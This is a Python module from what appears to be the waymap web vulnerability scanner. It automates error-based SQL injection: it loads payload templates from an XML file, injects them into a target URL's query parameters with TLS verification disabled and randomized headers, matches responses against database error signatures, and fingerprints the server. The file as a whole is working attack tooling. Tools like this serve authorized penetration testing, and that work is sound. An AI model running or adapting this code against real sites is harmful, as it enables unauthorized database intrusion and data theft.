# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# error.py 

import requests
import xml.etree.ElementTree as ET
import random
import re
import time
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
import urllib3
from lib.parse.random_headers import generate_random_headers
from lib.injection.sqlin.sql import abort_all_tests

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
successful_requests = 0
failed_requests = 0

headers = generate_random_headers()


def parse_error_based_tests_from_xml(file_path="data/error_based.xml"):
    """Parse error-based SQLi test cases from XML."""
    tree = ET.parse(file_path)
    root = tree.getroot()
    tests = []

    for test in root.findall('test'):
        title = test.find('title').text
        payload_template = test.find('./request/payload').text
        dbms = test.find('./details/dbms').text if test.find('./details/dbms') is not None else 'Unknown'
        dbms_version = test.find('./details/dbms_version').text if test.find('./details/dbms_version') is not None else ''

        tests.append({
            'title': title,
            'payload_template': payload_template,
            'dbms': dbms,
            'dbms_version': dbms_version
        })
    return tests

def replace_placeholders(template, delimiters, rand_numbers):
    """Replace placeholders in the template with generated values and remove any single quotes."""
    replaced_template = (template
                         .replace("[DELIMITER_START]", delimiters[0])
                         .replace("[DELIMITER_STOP]", delimiters[1])
                         .replace("[RANDNUM]", str(rand_numbers[0])))

    for i, rand_num in enumerate(rand_numbers[:5], start=1):
        replaced_template = replaced_template.replace(f"[RANDNUM{i}]", str(rand_num))

    replaced_template = replaced_template.replace("'", "")
    return replaced_template

def inject_payload(url, payload):
    """Inject the payload into URL query parameters."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    for param in query_params:
        test_url = f"{url}&{param}={query_params[param][0]} {payload}"
        yield test_url

def detect_server_info(url):
    """Detect server and web technology from headers."""
    response = requests.head(url, headers=headers, verify=False)
    server = response.headers.get('Server', 'Unknown')
    technology = response.headers.get('X-Powered-By', 'Unknown')
    return server, technology

def error_based_sqli(url, test):
    """Perform error-based SQL injection testing."""
    global successful_requests, failed_requests

    delimiters = ('0x716a6b7671', '0x7171766b71')
    rand_numbers = [random.randint(1000, 9999) for _ in range(5)]
    payload = replace_placeholders(test['payload_template'], delimiters, rand_numbers)

    current_time = time.strftime('%H:%M:%S', time.localtime())
    print(f"{Style.BRIGHT}[{Fore.BLUE}{current_time}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}]: {Fore.CYAN}{test['title']}{Style.RESET_ALL}")

    custom_patterns = [
        "Duplicate entry 'qjkvq1qqvkq1' for key 'group_key'",
        "qjkvq1qqvkq1"
    ]

    for test_url in inject_payload(url, payload):
        try:
            if make_request(test_url, custom_patterns):
                server, technology = detect_server_info(url)
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] Vulnerability found!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Target URL: {Fore.WHITE}{url}")
                print(f"{Fore.CYAN}Payload Title: {Fore.WHITE}{test['title']}")
                print(f"{Fore.CYAN}Payload Used: {Fore.WHITE}{payload}")
                print(f"{Fore.CYAN}DBMS Detected: {Fore.WHITE}{test['dbms'] if test['dbms'] else 'Unknown'}")
                print(f"{Fore.CYAN}Web Technology: {Fore.WHITE}{technology}")
                print(f"{Fore.CYAN}Server Name: {Fore.WHITE}{server}")
                print(f"{Fore.CYAN}Total Successful Requests: {Fore.WHITE}{successful_requests}")
                print(f"{Fore.CYAN}Total Failed Requests: {Fore.WHITE}{failed_requests}")
                return True
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Error with URL {test_url}: {e}{Style.RESET_ALL}")
            failed_requests += 1
    return False

def make_request(test_url, custom_patterns):
    """Make a request and check for custom patterns in response."""
    global successful_requests, failed_requests
    try:
        response = requests.get(test_url, headers=headers, verify=False)
        successful_requests += 1

        for pattern in custom_patterns:
            if re.search(pattern, response.text):
                return True
    except requests.RequestException as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")
        failed_requests += 1
    return False

def run_error_based_tests(target_url):
    """Run error-based SQLi tests on the target URL."""
    start_time = time.time()
    tests = parse_error_based_tests_from_xml()

    print(f"{Style.BRIGHT}Testing URL: {target_url}{Style.RESET_ALL}")

    for test in tests:
        if error_based_sqli(target_url, test):
            end_time = time.time()
            total_time = (end_time - start_time) / 60
            print(f"{Style.BRIGHT}{Fore.GREEN}Vulnerability found! Stopping further tests for this URL.{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Total Time Taken: {Fore.WHITE}{total_time:.2f} minutes")
            return

    end_time = time.time()
    total_time = (end_time - start_time) / 60
    print(f"{Style.BRIGHT}{Fore.RED}URL not vulnerable to Error-based SQL Injection.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Total Time Taken: {Fore.WHITE}{total_time:.2f} minutes")

def process_urls(urls):
    global abort_all_tests
    for url in urls:
        if abort_all_tests:
            break
        
        try:
            run_error_based_tests(url)
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}Process interrupted by user.{Style.RESET_ALL}")
            while True:
                user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next URL or 'e' to exit all tests: {Style.RESET_ALL}")
                if user_input.lower() == 'n':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Continuing with next URL...{Style.RESET_ALL}")
                    break
                elif user_input.lower() == 'e':
                    abort_all_tests = True  
                    print(f"{Style.BRIGHT}{Fore.RED}Exiting all SQL Injection tests...{Style.RESET_ALL}")
                    return
                elif user_input == '':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Resuming scan...{Style.RESET_ALL}")
                    break  
                else:
                    print(f"{Style.BRIGHT}{Fore.YELLOW}Invalid input, please try again.{Style.RESET_ALL}")